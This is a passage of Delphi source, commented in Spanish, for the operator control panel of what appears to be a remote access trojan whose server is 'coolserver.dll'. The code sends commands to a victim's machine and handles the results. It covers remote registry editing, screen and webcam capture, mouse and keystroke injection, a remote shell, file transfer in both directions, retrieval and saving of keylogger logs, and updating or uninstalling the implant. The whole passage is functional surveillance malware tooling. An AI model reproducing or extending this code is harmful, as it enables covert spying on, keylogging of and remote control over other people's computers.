      Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.Valoralfanumrico1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connection.Connected then
  begin
    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_SZ');
    NewRegistro.ShowModal;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.Valorbinerio1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connection.Connected then
  begin
    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_BINARY');
    NewRegistro.ShowModal;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.valorDWORD1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connection.Connected then
  begin
    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_DWORD');
    NewRegistro.ShowModal;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.Valordecadenamltiple1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connection.Connected then
  begin
    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text,
      'REG_MULTI_SZ');
    NewRegistro.ShowModal;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.TreeViewRegeditContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: boolean);
begin
  //Para que al hacer click derecho sobre un item este pase a estar seleccionado
  if TreeViewRegedit.GetNodeAt(MousePos.X, MousePos.Y) <> nil then
  begin
    TreeViewRegedit.Selected := TreeViewRegedit.GetNodeAt(MousePos.X, MousePos.Y);
    //Desactivamos algunas opciones del popupmenu que no podemos usar con las claves como modificar
    PopupRegistro.Items[1].Enabled := False;
    PopupRegistro.Items[2].Enabled := False;
    //Activamos el resto
    PopupRegistro.Items[3].Enabled := True;
  end
  else //No se ha seleccionado item, así que solo mostramos el menu de nuevo
  begin
    PopupRegistro.Items[1].Enabled := False;
    PopupRegistro.Items[2].Enabled := False;
    PopupRegistro.Items[3].Enabled := False;
  end;
end;

procedure TFormControl.ListViewRegistroContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: boolean);
begin
  //Se ha seleccionado un item
  if ListViewRegistro.Selected <> nil then
  begin
    //Habilitamos las opciones para trabajar con claves
    PopupRegistro.Items[1].Enabled := True;
    PopupRegistro.Items[2].Enabled := True;
    PopupRegistro.Items[3].Enabled := True;
  end
  else
  begin
    //No se ha seleccionado un item, solo mostramos el menu Nuevo
    PopupRegistro.Items[1].Enabled := False;
    PopupRegistro.Items[2].Enabled := False;
    PopupRegistro.Items[3].Enabled := False;
  end;
end;

procedure TFormControl.Clave1Click(Sender: TObject);
var
  NewClave: string;
begin
  if Servidor.Connection.Connected then
  begin
    NewClave := InputBox('Escriba el nombre para la nueva clave.',
      'Crear nueva clave', 'NuevaClave');
    if NewClave <> '' then
      Servidor.Connection.Writeln('NEWCLAVE|' + EditPathRegistro.Text + '|' + NewClave);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.BtnEnviarMensajeClick(Sender: TObject);
var
  Tipo: string;
begin
  if Servidor.Connection.Connected then
  begin
    if RdGrpBotonesMensaje.ItemIndex <> -1 then
    begin
      if RdBtnError.Checked then
        Tipo := 'WARN'
      else if RdBtnPregunta.Checked then
        Tipo := 'QUES'
      else if RdBtnExclamacion.Checked then
        Tipo := 'EXCL'
      else if RdBtnInfo.Checked then
        Tipo := 'INFO'
      else if RdBtnVacio.Checked then
        Tipo := 'VACI';
      Servidor.Connection.Writeln('MSJN' + MemoMensaje.Text + '|' +
        EditTituloMensaje.Text + '|' + Tipo + '|' +
        PChar(IntToStr(RdGrpBotonesMensaje.ItemIndex)) + '|');
    end
    else
      MessageDlg('Selecciona algún tipo de botón', mtWarning, [mbOK], 0);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.TrackBarCalidadChange(Sender: TObject);
begin
  LabelPosicionCompresJpg.Caption := IntToStr(TrackBarCalidad.Position) + '%';
end;

procedure TFormControl.BtnCapturarScreen1Click(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    Exit;
  end;

  imgCaptura.Picture := nil; //Refrescamos
  pedirJPG(0,'');
end;


procedure TFormControl.Enviarteclas1Click(Sender: TObject);
//Enviar teclas a una ventana....
var
  NewSendKeys: TFormSendKeys;
begin
  if Servidor.Connection.Connected then
  begin
    if ListViewVentanas.Selected = nil then
    begin
      MessageDlg('Selecciona alguna ventanta para enviarle teclas.',
        mtWarning, [mbOK], 0);
    end
    else
    begin
      NewSendKeys := TFormSendKeys.Create(self, Servidor,
        ListViewVentanas.Selected.SubItems[0], ListViewVentanas.Selected.Caption);
      NewSendKeys.Show;
    end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.TrackBarCalidadWebcamChange(Sender: TObject);
begin
  LabelPosicionCompresJpgWebcam.Caption :=
    IntToStr(TrackBarCalidadWebcam.Position) + ' %';
end;

procedure TFormControl.BtnObtenerWebcamsClick(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('LISTARWEBCAMS')
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.BtnCapturarWebcamClick(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    Exit;
  end;

  if(ComboBoxWebcam.Items.Count=0) or (ComboBoxWebcam.Items.Text = '') then Exit;

  imgWebcam.Picture := nil; //Refrescamos
  PedirJPG(1,'');
end;

procedure TFormControl.EnviarClickM(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: integer);
var
  AltoCap, AnchoCap: integer;
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    exit;
  end;

  if CheckBoxMouseClicks.Checked then
  begin

    if(anchurapantalla = 0) then //necesitamos el tamaño de la pantalla para calcular la posicion real.
    begin
      MessageDlg('Pide una captura primero!', mtWarning, [mbOK], 0);
      exit;
    end;
    
    AnchoCap := AnchuraPantalla;
    AltoCap := AlturaPantalla;
    X := (X * AnchoCap) div (imgCaptura.Width); //Una regla de tres
    Y := (Y * AltoCap) div (imgCaptura.Height);
    if button = mbLeft then
      Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' +
        IntToStr(y) + '|' + 'CLICKIZQ' + '|')
    else if button = mbRight then
      Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' +
        IntToStr(y) + '|' + 'CLICKDER' + '|');
  end;
end;

procedure TFormControl.BtnActualizarServidorInfoClick(Sender: TObject);
begin
  BtnActualizarServidorInfo.enabled := false;
  if Servidor.connection.Connected then
    Servidor.connection.writeln('SERVIDOR|INFO|')
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;

procedure TFormControl.BtnEnviarComandoServidorClick(Sender: TObject);
begin

  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    exit;
  end;

  if ComboBoxGestionDeServidor.Text = 'Cerrar' then
  begin
    if MessageBox(Handle,
      '¿Está seguro de que desea cerrar el servidor? Este no se volverá a iniciar si no están activos los métodos de auto-inicio.',
      'Confirmación', Mb_YesNo + MB_IconAsterisk) = idYes then
      Servidor.Connection.Writeln('SERVIDOR|CERRAR|');
  end;
  if ComboBoxGestionDeServidor.Text = 'Desinstalar' then
  begin
    if MessageBox(Handle,
      '¿Está seguro de que desea desinstalar el servidor? ¡Este será removido completamente del equipo!',
      'Confirmación', Mb_YesNo + MB_IconAsterisk) = idYes then
      Servidor.Connection.Writeln('SERVIDOR|DESINSTALAR|');
  end;
  if ComboBoxGestionDeServidor.Text = 'Actualizar' then
  begin
    if MessageBox(Handle,
      '¿Está seguro de que desea actualizar el servidor? ¡Se volverá a enviar coolserver.dll!',
      'Confirmación', Mb_YesNo + MB_IconAsterisk) = idYes then
      Servidor.Connection.Writeln('SERVIDOR|ACTUALIZAR|');
  end;
end;

procedure TFormControl.BtnVerGrandeCapClick(Sender: TObject);
var
  NewScreenMax: TScreenMax;
begin
  NewScreenMax := TScreenMax.Create(self, ImgCaptura.Picture, Servidor,
    CheckBoxMouseClicks.Checked);
  NewScreenMax.ShowModal; //Form para mostrar la captura más grande...
end;


procedure TFormControl.TimerCaptureScreenTimer(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    self.TimerCaptureScreen.Enabled := False;
    exit;
  end;
  pedirJPG(0,'');
 end;

//El popup de Descargar fichero añade el archivo al ListView de descargas, lo encola
procedure TFormControl.Descargarfichero1Click(Sender: TObject);
var
  FilePath: ansistring;
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    exit;
  end;

  mslistviewitem := ListViewArchivos.Selected;
while Assigned(mslistviewitem) do
begin

   FilePath := Trim(EditPathArchivos.Text) + Trim(mslistviewitem.Caption);
  if (mslistviewitem.ImageIndex = 3) then
  begin
    PageControl.activepage := TabTransferencias;
    Servidor.Connection.Writeln('GETFOLDER|' + FilePath+'\');
  end
  else
      agregardescarga(FilePath);

  mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
end;





end;

//El popup de Subir fichero añade el archivo al ListView de descargas, lo encola
procedure TFormControl.Subirfichero1Click(Sender: TObject);
var
  i: integer;
  Descarga: TDescargaHandler;
  FilePath: ansistring;
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    exit;
  end;

  if EditPathArchivos.Text = '' then
  begin
    MessageDlg('Entra al directorio primero!', mtWarning, [mbOK], 0);
    exit;
  end;

  if OpenDialogUpload.Execute then
  begin
    //nos aseguramos de que el archivo no este en la lista de
    //descargas (sin importar si esta transfiriendo o si ya finalizo)
    FilePath := OpenDialogUpload.FileName;
    FilePath := EditPathArchivos.Text + ExtractFileName(OpenDialogUpload.FileName);
    for i := 0 to ListViewDescargas.Items.Count - 1 do
    begin
      Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
      if Descarga.Origen = FilePath then
      begin
        MessageDlg('El achivo ya se encuentra en la lista de descargas',
          mtWarning, [mbOK], 0);
        Exit;
      end;
    end;
    Servidor.Connection.Writeln('SENDFILE|' + OpenDialogUpload.FileName +
      '|' + EditPathArchivos.Text + ExtractFileName(OpenDialogUpload.FileName) +
      '|' + IntToStr(MyGetFileSize(OpenDialogUpload.FileName)));
  end;
end;

procedure TFormControl.OnReadFile(AThread: TIdPeerThread);
var
  Buffer: string;
  Descarga: TDescargaHandler;
  FilePath: ansistring;
  Size: int64;
  i: integer;
  MS:TMemoryStream;
  JPG: TJPEGImage;
begin
  Buffer := Trim(Athread.Connection.ReadLn);
  if Copy(PChar(Buffer), 1, 7) = 'GETFILE' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
    Delete(Buffer, 1, Pos('|', Buffer));
    Size := StrToInt(Trim(Buffer));
    CrearDirectoriosUsuario();
    Descarga := TDescargaHandler.Create(Athread, FilePath, Size,
    ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\'+
    ExtractFileName(FilePath), ListViewDescargas, True);
    Descarga.callback := Self.TransferFinishedNotification;
    Descarga.transferFile;
  end
  else if Copy(PChar(Buffer), 1, 14) = 'RESUMETRANSFER' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
    Delete(Buffer, 1, Pos('|', Buffer));
    Size := StrToInt(Buffer);
    for i := 0 to ListViewDescargas.Items.Count - 1 do
    begin
      Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
      if Descarga.Origen = FilePath then
      begin
        Descarga.AThread  := Athread; //El socket anterior ya esta desconectado
        Descarga.SizeFile := Size;
        Descarga.ResumeTransfer;
        Exit;
      end;
    end;
  end
  else if Copy(PChar(Buffer), 1, 8) = 'SENDFILE' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    FilePath := Trim(Buffer);
    Size     := MyGetFileSize(FilePath);
    Descarga := TDescargaHandler.Create(Athread, FilePath, Size, '',
    ListViewDescargas, False);
    Descarga.UploadFile;
  end
  else if Copy(PChar(Buffer), 1, 9) = 'CAPSCREEN' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
    AnchuraPantalla := StrToInt(Copy(FilePath, 1, Pos('¬', FilePath) - 1));
    Delete(FilePath, 1, Pos('¬', FilePath));
    AlturaPantalla := StrToInt(FilePath);
    Delete(Buffer, 1, Pos('|', Buffer));
    Size := StrToInt(Trim(Buffer));
    BtnCapturarScreen.Enabled := False;
    MS := TMemoryStream.Create;
    MS.Position := 0;
    GenericBar := ProgressBarScreen;
    ObtenerScreenCap_CamCap(AThread, Size, MS);
    MS.Position := 0;
    JPG := TJPEGImage.Create;
    JPG.LoadFromStream(MS);
    imgCaptura.Width := JPG.Width; //Establecemos ancho
    imgCaptura.Height := JPG.Height; //Establecemos alto
    imgCaptura.picture.Assign(JPG);
    StatusBar.Panels[1].Text := inttostr(MS.Size div 1024)+'KB'; //Es interesante saber el tamaño
    if(PrefijoGuardarCaptura <> '') then
    begin
      InumeroCaptura := InumeroCaptura+1;
      CrearDirectoriosUsuario();
      while fileexists(extractfiledir(paramstr(0))+'\Usuarios\'+NombrePc+'\Capturas\'+PrefijoGuardarCaptura+inttostr(InumeroCaptura)+'.jpg') do
        PrefijoGuardarCaptura := PrefijoGuardarCaptura + '_';
        MS.SaveToFile(extractfiledir(paramstr(0))+'\Usuarios\'+NombrePc+'\Capturas\'+PrefijoGuardarCaptura+inttostr(InumeroCaptura)+'.jpg');
    end;
    MS.Free;
    JPG.Free;
    BtnCapturarScreen.Enabled := True;
    RecibiendoJPG := false;
  end
  else if Copy(PChar(Buffer), 1, 13) = 'CAPTURAWEBCAM' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    //FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
    //AnchuraWebCam := StrToInt(Copy(FilePath, 1, Pos('¬', FilePath) - 1));
    //Delete(FilePath, 1, Pos('¬', FilePath));
    //AlturaWebCam := StrToInt(FilePath);
    Delete(Buffer, 1, Pos('|', Buffer));
    Size := StrToInt(Trim(Buffer));
    BtnCapturarWebcam.Enabled := False;
    MS := TMemoryStream.Create;
    MS.Position := 0;
    GenericBar := ProgressBarWebCam;
    ObtenerScreenCap_CamCap(AThread, Size, MS);
    MS.Position := 0;
    JPG := TJPEGImage.Create;
    JPG.LoadFromStream(MS);
    imgWebcam.Width := JPG.Width; //Establecemos ancho
    imgWebcam.Height := JPG.Height; //Establecemos alto
    imgWebcam.picture.Assign(JPG);
    StatusBar.Panels[1].Text := inttostr(MS.Size div 1024)+'KB'; //Es interesante saber el tamaño
    if(PrefijoGuardarWebcam <> '') then
    begin
      InumeroWebcam := InumeroWebcam+1;
      CrearDirectoriosUsuario();
      while fileexists(extractfiledir(paramstr(0))+'\Usuarios\'+NombrePc+'\Webcam\'+PrefijoGuardarWebcam+inttostr(InumeroWebcam)+'.jpg') do
        PrefijoGuardarWebcam := PrefijoGuardarWebcam + '_';
      MS.SaveToFile(extractfiledir(paramstr(0))+'\Usuarios\'+NombrePc+'\Webcam\'+PrefijoGuardarWebcam+inttostr(InumeroWebcam)+'.jpg');
    end;
    MS.Free;
    JPG.Free;
    BtnCapturarWebcam.Enabled := True;
    RecibiendoJPG := false;
  end
  else if Copy(PChar(Buffer), 1, 9) = 'THUMBNAIL' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    Size := StrToInt(Trim(Buffer)); //Tamaño del Thumbnail
    GenericBar := (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail;
    MS := TMemoryStream.Create;
    MS.Position := 0;
    ObtenerScreenCap_CamCap(AThread, Size, MS);
    MS.Position := 0;
    if(MS.Size <> 1) then //Si es =1 es que ha habido un error
    begin
      JPG := TJPEGImage.Create;
      JPG.LoadFromStream(MS);
      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).imageThumnail.picture.Assign(JPG);
      JPG.Free;
    end
    else
    begin
      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).StatusBar.panels[3].text := 'Error al generar el thumbnail';
    end;
    MS.Free;
    RecibiendoJPG := false;
    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).callback();
  end
  else if Copy(PChar(Buffer), 1, 12) = 'KEYLOGGERLOG' then
  begin
    Delete(Buffer, 1, Pos('|', Buffer));
    Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del Log
    GenericBar := ProgressBarKeylogger;
    //StatusBar.Panels[1].Text := inttostr(size)+'B'; //Es interesante saber el tamaño
    ObteneryAniadirKeyloggerLog(AThread, Size); //Lo obtenemos y añadimos al richedit
    SpeedButtonRecibirLog.Enabled := true;
    RecibiendoJPG := false;
  end;
end;

procedure TFormControl.ObteneryAniadirKeyloggerLog(AThread: TIdPeerThread; filesize: int64);
var
  RecibidoTotal  : integer;
  buffSize       : integer;
  LineaNueva     : ansistring;
  UltimaLinea    : boolean;
  i              : integer;
begin
  if(filesize = 0) then exit;
  RichEditKeylogger.clear;
  pctProgressBarScreen := 0;
  Athread.Synchronize(UpdateProgressBarScreen);
  RecibidoTotal := 0;
  try
    while (RecibidoTotal < filesize) and (Athread.Connection.Connected) do
    begin
      LineaNueva := Athread.Connection.ReadLn;
      RecibidoTotal := RecibidoTotal + Length(LineaNueva)+2;
      if (Copy(LineaNueva, 1, 2) = '-[') then //evento
      begin
         RichEditKeylogger.SelAttributes.Style := [fsBold];
         RichEditKeylogger.SelAttributes.Color := clRed;
      end
      else if (Copy(LineaNueva, 1, 2) = '-{') then
      begin
         RichEditKeylogger.SelAttributes.Style := [fsBold];
         RichEditKeylogger.SelAttributes.Color := clgreen;
      end
      else
      begin
         RichEditKeylogger.SelAttributes.Style := [];
         RichEditKeylogger.SelAttributes.Color := clblack;
      end;
      if not (RecibidoTotal < Filesize) then ultimalinea := true;

      if((not ultimalinea)) then
        RichEditKeylogger.SelText :=LineaNueva+#13+#10
      else
      if((ultimalinea)) then
        RichEditKeylogger.SelText :=LineaNueva;
      pctProgressBarScreen := Round((RecibidoTotal * 100) / FileSize);
      Athread.Synchronize(UpdateProgressBarScreen);
    end;
  finally
    CreardirectoriosUsuario();

    while fileexists(extractfilepath(Paramstr(0))+'Usuarios\'+NombrePC+'\Klog'+inttostr(i)+'.txt') do
      i := i+1;

    RichEditKeylogger.plaintext := true;  //Se guarda como archivo de texto plano
    RichEditKeylogger.lines.savetofile(extractfilepath(Paramstr(0))+'Usuarios\'+NombrePC+'\Klog'+inttostr(i)+'.txt');
  end; //end de finally
end;


function TFormControl.ObtenerScreenCap_CamCap(AThread: TIdPeerThread; filesize: int64; var MS: TmemoryStream):string;
var
  Buffer: array[0..1023] of byte;
  Read, currRead: integer;
  buffSize: integer;
begin
  Read     := 0;
  currRead := 0;
  pctProgressBarScreen := 0;
  Athread.Synchronize(UpdateProgressBarScreen);
  buffSize := SizeOf(Buffer);
  try
    while (Read < FileSize) and (Athread.Connection.Connected) do
    begin
      if (FileSize - Read) >= buffSize then
        currRead := buffSize
      else
        currRead := (FileSize - Read);

      Athread.Connection.ReadBuffer(buffer, currRead);
      Read := Read + currRead;
      //BlockWrite(F, Buffer, currRead);

      MS.Write(Buffer, currRead);
      pctProgressBarScreen := Round((Read * 100) / FileSize);
      Athread.Synchronize(UpdateProgressBarScreen);
    end;
  finally
   //CloseFile(F);
    {Athread.Data := nil;
    Athread.Connection.Disconnect;    }
  end;//end de finally
end;


 //Se llama cada vez que finaliza una descarga para que se inicie
 //alguna otra descarga que haya sido puesta en cola
procedure TFormControl.TransferFinishedNotification(Sender: TObject);
var
  Descarga: TDescargaHandler;
  i: integer;
begin
  if not Servidor.Terminated and Servidor.Connection.Connected then
  begin
    for i := 0 to ListViewDescargas.Items.Count - 1 do
    begin
      Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
      if not Descarga.Transfering and not Descarga.cancelado and not
        Descarga.Finalizado and Descarga.es_descarga then //en espera
      begin
        Servidor.Connection.Writeln('RESUMETRANSFER|' + Descarga.Origen +
          '|' + IntToStr(Descarga.Descargado));
        Exit;
      end;
    end;
  end;
end;


procedure TFormControl.UpdateProgressBarScreen;
begin
  GenericBar.Position := pctProgressBarScreen;
  if(GenericBar.position = 100) then
    GenericBar.position := 0;//La reiniciamos
end;


procedure TFormControl.ListViewDescargasContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: boolean);
var
  Descarga: TDescargaHandler;
begin
  if ListViewDescargas.Selected <> nil then
  begin
    Descarga := TDescargaHandler(ListViewDescargas.Selected.Data);
    if Descarga.Transfering then
    begin
      PopupDescargas.Items[0].Enabled := True;
      PopupDescargas.Items[1].Enabled := False;
      PopupDescargas.Items[2].Enabled := False;
      PopupDescargas.Items[3].Enabled := False;
      PopupDescargas.Items[4].Enabled := False;
      PopupDescargas.Items[5].Enabled := False;
      PopupDescargas.Items[7].Enabled := False;
      //Algún día conseguiremos que se pueda cancelar una descarga o subida
    end
    else if (not Descarga.Transfering) {AND (not Descarga.cancelado)} and
      (not Descarga.Finalizado) then //En espera o cancelado
    begin
      PopupDescargas.Items[0].Enabled := False;
      PopupDescargas.Items[1].Enabled := True;
      PopupDescargas.Items[2].Enabled := True;
      PopupDescargas.Items[3].Enabled := True;
      PopupDescargas.Items[4].Enabled := True;
      PopupDescargas.Items[5].Enabled := True;
      PopupDescargas.Items[7].Enabled := True;
    end
    else if Descarga.Finalizado then
    begin
      PopupDescargas.Items[0].Enabled := False;
      PopupDescargas.Items[1].Enabled := False;
      PopupDescargas.Items[2].Enabled := True;
      PopupDescargas.Items[3].Enabled := True;
      PopupDescargas.Items[4].Enabled := True;
      PopupDescargas.Items[5].Enabled := True;
      PopupDescargas.Items[7].Enabled := True;
    end;
  end;
  if (ListViewDescargas.Selected = nil) then
  begin
    PopupDescargas.Items[0].Enabled := False;
    PopupDescargas.Items[1].Enabled := False;
    PopupDescargas.Items[2].Enabled := False;
    PopupDescargas.Items[3].Enabled := False;
    PopupDescargas.Items[4].Enabled := False;
    PopupDescargas.Items[5].Enabled := False;
    PopupDescargas.Items[7].Enabled := False;
  end;

  //Las subidas de archivo no se reanudan
  if not Descarga.es_descarga then
    PopupDescargas.Items[1].Enabled := False;

end;


//Popup eliminar descarga
procedure TFormControl.Eliminardescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
  i, j:     integer;
  TmpItem : Tlistitem;
begin
mslistviewitem := ListViewDescargas.Selected;
if mslistviewitem = nil then
  Exit;

while Assigned(mslistviewitem) do
begin

  if not TDescargaHandler(mslistviewitem.Data).Transfering then
  begin
   { TDescargaHandler(mslistviewitem.Data).ProgressBar.Free;
    TDescargaHandler(mslistviewitem.Data).Free;      }
    i := mslistviewitem.Index;
    tmpitem := mslistviewitem;  
    mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    tmpitem.Delete;

    for j := i to ListViewDescargas.Items.Count - 1 do
      //Si hay una progressbar subirla un puesto
      if ListViewDescargas.Items.Item[j].Data <> nil then
      begin
        Descarga := TDescargaHandler(ListViewDescargas.Items.Item[j].Data);
       { Descarga.ProgressBar.Top :=
          Descarga.ProgressBar.Top - (Descarga.ProgressBar.BoundsRect.Bottom -
          Descarga.ProgressBar.BoundsRect.Top);  }
      end;
  end;


end;
end;

//Popup borrar completados
procedure TFormControl.Borrarcompletados1Click(Sender: TObject);
var
  i, j:     integer;
  Descarga: TDescargaHandler;
begin
  {Lo recorremos en orden inverso sino al borrar el primer item, el resto se desplazaria hacia arriba y nos saldriamos del bucle}
  for i := ListViewDescargas.Items.Count - 1 downto 0 do
  begin
    Descarga := TDescargaHandler(ListViewDescargas.Items.Item[i].Data);
    if Descarga.Finalizado then
    begin  //Borrar el item descargado y subir todos hacia arriba
     // Descarga.ProgressBar.Free;
      ListViewDescargas.Items[i].Delete;
      Descarga.Free;
      //Mover los progressbar que halla por debajo hacia arriba
      for j := i to ListViewDescargas.Items.Count - 1 do
        //Si hay una progressbar subirla un puesto
        if ListViewDescargas.Items.Item[j].Data <> nil then
        begin
          Descarga := TDescargaHandler(ListViewDescargas.Items.Item[j].Data);
         { Descarga.ProgressBar.Top :=
            Descarga.ProgressBar.Top - (Descarga.ProgressBar.BoundsRect.Bottom -
            Descarga.ProgressBar.BoundsRect.Top); }
        end;
    end;
  end;
end;

//Subir al primer puesto
procedure TFormControl.Subiralprimerpuesto1Click(Sender: TObject);
var
  Item: TListItem;
  i, j: integer;
begin
  for i := 0 to ListViewDescargas.Items.Count - 1 do
    if ListViewDescargas.Items.Item[i].SubItems[0] = 'En espera' then
    begin
      if ListViewDescargas.ItemIndex = i then
        Exit;  //Es el primer item en espera no se puede subir más
      Item := TListItem.Create(ListViewDescargas.Items);
      Item.Assign(ListViewDescargas.Selected);
      for j := ListViewDescargas.Selected.Index downto i + 1 do
        ListViewDescargas.Items.Item[j] := ListViewDescargas.Items.Item[j - 1];
      ListViewDescargas.Items.Item[i] := Item;
      ListViewDescargas.ItemIndex := i;
      Item.Free;
      break;
    end;
end;

//Subir un puesto
procedure TFormControl.Subir1Click(Sender: TObject);
var
  Item: TListItem;
  i:    integer;
begin
  if ListViewDescargas.ItemIndex = 0 then
    exit;  //Si es el primero...
  //Si su item superior está tambien en espera se intercambia con él
  i := ListViewDescargas.ItemIndex;
  if ListViewDescargas.Items.Item[i - 1].SubItems[0] = 'En espera' then
  begin
    Item := TListItem.Create(ListViewDescargas.Items);
    Item.Assign(ListViewDescargas.Selected);
    ListViewDescargas.Items.Item[i] := ListViewDescargas.Items.Item[i - 1];
    ListViewDescargas.Items.Item[i - 1] := Item;
    ListViewDescargas.ItemIndex := i - 1;
    Item.Free;
  end;
end;

//Bajar un puesto
procedure TFormControl.Bajar1Click(Sender: TObject);
var
  Item: TListItem;
  i:    integer;
begin
  if ListViewDescargas.ItemIndex = ListViewDescargas.Items.Count - 1 then
    exit;  //Si es el último...
  //Si su item inferior está tambien en espera se intercambia con él
  i := ListViewDescargas.ItemIndex;
  if ListViewDescargas.Items.Item[i + 1].SubItems[0] = 'En espera' then
  begin
    Item := TListItem.Create(ListViewDescargas.Items);
    Item.Assign(ListViewDescargas.Selected);
    ListViewDescargas.Items.Item[i] := ListViewDescargas.Items.Item[i + 1];
    ListViewDescargas.Items.Item[i + 1] := Item;
    ListViewDescargas.ItemIndex := i + 1;
    Item.Free;
  end;
end;

//Bajar al ultimo puesto
procedure TFormControl.ltimopuesto1Click(Sender: TObject);
var
  Item: TListItem;
  i, j: integer;
begin
  //Buscamos el último item en espera y le insertamos ahi
  for i := ListViewDescargas.Items.Count - 1 downto 0 do
    if ListViewDescargas.Items.Item[i].SubItems[0] = 'En espera' then
    begin
      if ListViewDescargas.ItemIndex = i then
        Exit;  //Es el último item en espera no se puede bajar más
      Item := TListItem.Create(ListViewDescargas.Items);
      Item.Assign(ListViewDescargas.Selected);
      for j := i + 1 to ListViewDescargas.Selected.Index do
        ListViewDescargas.Items.Item[j] := ListViewDescargas.Items.Item[j + 1];
      ListViewDescargas.Items.Item[i] := Item;
      ListViewDescargas.ItemIndex := i;
      Item.Free;
      break;
    end;
end;

procedure TFormControl.Activar2Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('SHELL|ACTIVAR')
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
end;


procedure TFormControl.ComboBoxShellCommandKeyPress(Sender: TObject; var Key: char);
begin
  if not Servidor.Connection.Connected then
  begin
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
    exit;
  end;

  if Key = #13 then
  begin
    if Lowercase(ComboBoxShellCommand.Text) = 'cls' then
      MemoShell.Text := '';
    MemoShell.Text := Trim(MemoShell.Text);
    Servidor.Connection.Writeln('SHELL|' + ComboBoxShellCommand.Text);

    //Agrega el comando que acabo de escribir a la lista de comandos del combobox
    if ComboBoxShellCommand.Items.Count > 0 then //inserta un item de primero en la lista
    begin
      if ComboBoxShellCommand.Text <> ComboBoxShellCommand.Items[0] then
        ComboBoxShellCommand.Items.Insert(0, ComboBoxShellCommand.Text);
    end
    else
      ComboBoxShellCommand.Items.Add(ComboBoxShellCommand.Text);
    //limpiar comando
    ComboBoxShellCommand.Text := '';
  end;
end;

procedure TFormControl.BtnCambiarFuenteShellClick(Sender: TObject);
begin
  if DlgFont.Execute then
  begin
    MemoShell.Font := DlgFont.Font;
    ComboBoxShellCommand.Font := DlgFont.Font;
    if MemoShell.Color = MemoShell.Font.Color then
      MessageBox(Handle,
        'Se escogió el mismo color para la fuente y el fondo. Escoge otro.',
        'Advertencia', 0 + MB_IconWarning);
  end;
end;

procedure TFormControl.BtnCambiarColorShellClick(Sender: TObject);
begin
  if DlgColors.Execute then
  begin
    MemoShell.Color := DlgColors.Color;
    ComboBoxShellCommand.Color := DlgColors.Color;
    if MemoShell.Color = MemoShell.Font.Color then
      MessageBox(Handle,
